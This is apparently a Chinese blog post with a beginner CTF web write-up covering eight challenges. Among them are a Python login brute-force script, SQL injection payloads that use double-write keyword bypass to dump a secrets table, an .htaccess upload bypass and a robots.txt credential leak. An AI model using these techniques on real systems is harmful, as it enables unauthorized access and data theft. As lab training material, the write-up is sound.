---
title: PKWCTF新生WEB-“看看就好”
url: https://mp.weixin.qq.com/s/mRyTGKxTefthw4mvAor0Lg
source: Doonsec's feed
date: 2026-09-27
fetch_date: 2026-09-28T07:53:55.893047
---

# PKWCTF新生WEB-“看看就好”

# PKWCTF新生WEB-“看看就好”

原创

玄网安全 opis
玄网安全 opis

玄网安全

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

# WEB1:纸上谈兵

![](https://mmbiz.qpic.cn/mmbiz_jpg/hiaeZ5goDm5fBUXsgoMFMzLbYnic65snF8kv92yrjEUeUiaib1aJqdPibIXbaJeeN0hQoI3eicWVbNbI6kX6XyEV0m5mjuChoonDb1TCcFRvPYdiak/640?wx_fmt=webp&from=appmsg)

`一开始测试 ssti发现不行，在看到解析想到XML注入`

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/hiaeZ5goDm5fDiceeud3UdibvZrnVoxF2mldJO8tBTheJTuFoaSpGkKaLic02vece6kib6HjAcvEZLZSplHkLYiasyenc9BibEsjyslDm0ia4wqlZK0/640?wx_fmt=webp&from=appmsg)

# WEB2:签到题

`1:提示看源码`

`2:f12被禁 | ctrl+u`

#### 使用 view-source:

![](https://mmbiz.qpic.cn/mmbiz_jpg/hiaeZ5goDm5cWib13cyJrfVvkmknKOmAycibwNjhGia3OtmBWd8CyOLy3XichbN0tLstVt6ibfoeMzd4sbfBSvmEnaQw8S4TWDrFMGeEMbsMhC4xY/640?wx_fmt=webp&from=appmsg)`PKWCTF{dce6b5e5-9359-4953-9659-d27c6d7c0255}`

# WEB3:mio上传

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/hiaeZ5goDm5cY6lXZKujgQlsGZBwD0Vic4iadRXlkpicowaqoiaICoIvSuznuicNcdnrzEodAZiaYumBUh4ndn5hjwPQ5Z9uudUtdvog3ribZcM9N1A/640?wx_fmt=webp&from=appmsg)`重点提示：PHP文件不行，那可以想到上传php不能解析，可能用到.htaccess`

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/hiaeZ5goDm5f0YVf9gZSLzOyNib4nsJTiahOaXiaMs5BShozibVyEwH3KV5jNY269sy3AfqjIdofsaUV7NN3czFyiaVKHCSWDOI1LpwAtgrrpch48/640?wx_fmt=webp&from=appmsg)![](https://mmbiz.qpic.cn/mmbiz_jpg/hiaeZ5goDm5eaNwndWHrKgaSax14a8LR2DfU94s3mrAQ1cibibjFOdvbffcGDHFibPfKB924IwMpKoI2TBS1cD0NCYKRy3xpQbOWDCVXiahFRs14/640?wx_fmt=webp&from=appmsg)![](https://mmbiz.qpic.cn/mmbiz_jpg/hiaeZ5goDm5cVO9m3xCO8yHbhBQTGuewu3urEz80DtObPZtUWh1xEUOf0M8BjwJpia5GDrxiak6KibxMeZLqhY5P0a5UfGBgHtD8iaYNQdKmyo6k/640?wx_fmt=webp&from=appmsg)

# WEB4:mio空间

`目录扫描发现：www.zip`

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/hiaeZ5goDm5dPr3gXEibUxBULBPGkqfNf2edOqpEJDxk5OL1ibwGWZTmiaW5xTFFVRCvbWEicP8dRJzBbYiaR7yhficnJfLwPuic7HNydlZ6BWUj5Q8/640?wx_fmt=webp&from=appmsg)`里面有字典，进行爆破`

![](https://mmbiz.qpic.cn/mmbiz_jpg/hiaeZ5goDm5ceZPiaUZFyesicgVA5EiaN7N2Zu6KmcIibkbicWricTJXRAY9qzeqh9H5kP1HZy2I6UpGhqSV6aIoQm3XVRhaQG9TiavAwnbT7oatbBo/640?wx_fmt=webp&from=appmsg)`BP爆破有问题 全部都是错的 改慢一点`

```
import requests
import time

url = "http://80-8a7fb2cf-6105-48b7-adb8-28b2aa787774.challenge.ctfplus.cn/"
wordlist = r"C:\Users\34645\AppData\Local\Temp\opencode\www_extracted\字典.txt"
log_path = r"C:\Users\34645\AppData\Local\Temp\opencode\brute_log.txt"

s = requests.Session()

def post(user, pwd):
    r = s.post(url, data={"username": user, "password": pwd}, timeout=20)
    return r.status_code, len(r.text), r.text, r.headers.get("Location"), r.url

# baseline
st, ln, text, loc, final = post("admin", "definitely_wrong_password_xxx")
print("baseline admin/wrong", st, ln, loc, final)
i = text.find('class="error"')
print("err", text[i:i+80].encode("ascii","backslashreplace").decode() if i!=-1 else "NOERR")

st, ln, text, loc, final = post("notadmin", "123456")
print("baseline baduser", st, ln, loc, final)
i = text.find('class="error"')
print("err", text[i:i+80].encode("ascii","backslashreplace").decode() if i!=-1 else "NOERR")

# specials
specials = ["pkw123", "PKW123", "from91", "fill.com", "52tiance", "nuttertools", "wpc000821", "171204jg", "sj811212", "imzzhan", "stryker"]
for p in specials:
    st, ln, text, loc, final = post("admin", p)
    has_err = 'class="error"' in text
    print("special", p, st, ln, "err", has_err)
    if not has_err and st == 200:
        open(r"C:\Users\34645\AppData\Local\Temp\opencode\brute_hit.html","w",encoding="utf-8").write(text)
        print("HIT", p)
        raise SystemExit

pwds = [l.strip() for l in open(wordlist, encoding="utf-8") if l.strip()]
print("start brute", len(pwds))

with open(log_path, "w", encoding="utf-8") as log:
    for i, p in enumerate(pwds, 1):
        try:
            st, ln, text, loc, final = post("admin", p)
        except Exception as e:
            print("ERR", i, p, e)
            time.sleep(1)
            continue
        has_err = 'class="error"' in text
        if st != 200 or not has_err or ln not in (3358, 3296):
            msg = f"ANOMALY {i} {p} status={st} len={ln} err={has_err} loc={loc} url={final}\n"
            print(msg.strip())
            log.write(msg)
            log.write(text[:500] + "\n")
            if st == 200 and not has_err:
                open(r"C:\Users\34645\AppData\Local\Temp\opencode\brute_hit.html","w",encoding="utf-8").write(text)
                print("HIT", p)
                break
        if i % 100 == 0:
            print("progress", i, p, st, ln, has_err)
            log.write(f"progress {i} {p} {st} {ln}\n")
            log.flush()
print("finished")
```

`pkw123`![](https://mmbiz.qpic.cn/mmbiz_jpg/hiaeZ5goDm5cQgZMq40aCfzMSVarzuT2S1WOFWkFPUPdQU6zOMGAPXPh9KXZ23xqxkQ2JLfdORkyHqyuVPfAJiclRB1Fib9WibY3zyjo4SzbPYc/640?wx_fmt=webp&from=appmsg)

# WEB5:PKWSEC 员工名录

![](https://mmbiz.qpic.cn/mmbiz_jpg/hiaeZ5goDm5fAdBpEn2MMObLCSj0DV7Vu9h7nGuscsXXnsBYmq70GS7XGhEqibV1AynfibtzMdWGib4uNMlVQybyntUalx36MRCI8V5TGpzOLg8/640?wx_fmt=webp&from=appmsg)`在url/?username=1 发现可疑sql注入`

###### 提示已过滤关键词：union、or

`进行双写绕过`

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/hiaeZ5goDm5cy1s83kN8DpMJISmwqqRDJrpK6v7ZYewc9oNFJAiaibGGpF5cHQibVxG6K3xE5N4yo24oibGuJBZsqSW0ia0UtuDAdnh1LoXicUptho/640?wx_fmt=webp&from=appmsg)![](https://mmbiz.qpic.cn/mmbiz_jpg/hiaeZ5goDm5eFEfw9EQjrYuQReF9VAPu1n9fAHKcwgA3xhWaJsQicuSn4HSWuibe2ib1NCanDZanfpLkVjdJXlPDw4mNf1lnbO1SDoThbaJeLPE/640?wx_fmt=webp&from=appmsg)

```
" ununionion select 1,column_name,table_name,3 from infoorrmation_schema.columns where table_schema=database()--

ID 员工 邮箱
1 id confidential_docs
1 doc_title confidential_docs
1 doc_secret confidential_docs
1 id users
1 username users
1 email users
1 secret users

" ununionion select 1,doc_title,doc_secret,4 from confidential_docs--

D 员工 邮箱
1 员工名录（未脱敏） PKWCTF{ef150bdd-cdca-4d7c-a3c3-53b007b8eac5}
PKWSEC
```

# WEB6:4048

`找到js文件，搜索flag`![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/hiaeZ5goDm5cfr2mrrtx0LyQttfeDHxl4cYibaJ5oHOSK8uiawUR6ktLJ4OD7EEQ8jySgtQrkwF9bLBia0ib7n2oQKv9dnYn6JfJ9ibSa7KItapqA/640?wx_fmt=webp&from=appmsg)

```
// Check victory
function checkWin() {
    if (winFlagShown) return;
    if (score === 4048) {
        winFlagShown = true;
        statusBadge.textContent = document.querySelector('#winModal h2').textContent;
        statusBadge.style.color = '#ffd700';
        showWinModal();
        const ENCODED_FLAG = '0x50, 0x4b, 0x57, 0x43, 0x54, 0x46, 0x7b, 0x33, 0x66, 0x66, 0x30, 0x62, 0x62, 0x35, 0x37, 0x2d, 0x61, 0x61, 0x39, 0x39, 0x2d, 0x34, 0x64, 0x65, 0x38, 0x2d, 0x61, 0x30, 0x61, 0x37, 0x2d, 0x36, 0x35, 0x35, 0x63, 0x32, 0x62, 0x63, 0x39, 0x62, 0x34, 0x63, 0x34, 0x7d';
        const byteStrArr = ENCODED_FLAG.split(',').map(s => s.trim().replace(/^0x/,''));
        const realHex = byteStrArr.join('');
        const decoded = window.__Jsfuck.decode(realHex);
        console.log('score = 4048,Flag :', decoded);
        flagDisplay.textContent = decoded;
        modalOverlay.classList.add('active');
    }
}

PKWCTF{3ff0bb57-aa99-4de8-a0a7-655c2bc9b4c4}
```

# WEB7:元素属性

`分析：http://3000-47157252-48e7-424d-acc0-c32d55a96d73.challenge.ctfplus.cn/static/app.js`

![](https://mmbiz.qpic.cn/mmbiz_jpg/hiaeZ5goDm5eYWUz5vUHy4hLHYfuorZJKaxsGo8Kt9p46BVM8VxicFxNm196wbfjJLN84QfyqfSTQpJ06ibY543fXAep29icj5QA3Gia63BicAeHw/640?wx_fmt=webp&from=appmsg)

```
核心：绕过前端的 "LOCKED" 禁用按钮
```

`看到题目 robots,会不会是robots.txt`

![](https://mmbiz.qpic.cn/mmbiz_jpg/hiaeZ5goDm5fGLGYBl5EoDibHC2gKeG1mcTVpccwHvicibANPPTFwIgYbqnzjTWFe8R6AkPtO6udtDcJAeXPrnALpp6SY2ZJLShmLib60Z7ZvBTI/640?wx_fmt=webp&from=appmsg)`泄露/robotx.txt，得到username=adminroot password=112233`

![](https://mmbiz.qpic.cn/mmbiz_jpg/hiaeZ5goDm5dkBzRtJd10WHe2umgTRd7IAsYBCXPdlOz2kwkX07hNZlsuWY47g2qld1WlVBmvv87BibtCBCsNTysGfgJSu56IHLPQVL8Ociazo/640?wx_fmt=webp&from=appmsg)

# WEB8:probe

```
<!-- Step 2: PUT / -->Welcome, explorer. But GET is not enough... Try other methods.
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/hiaeZ5goDm5cJydlhIKQamiaEY7HcBgCsyrB12RsW12U13A3PwE9bv9LwsY28mbRkRicczygUs4NtqVmsr0YCeX9eGvQRY5EQNTak3kK9AdmJ8/640?wx_fmt=webp&from=appmsg)

```
<!-- Step 3: POST /probe -->Good. No...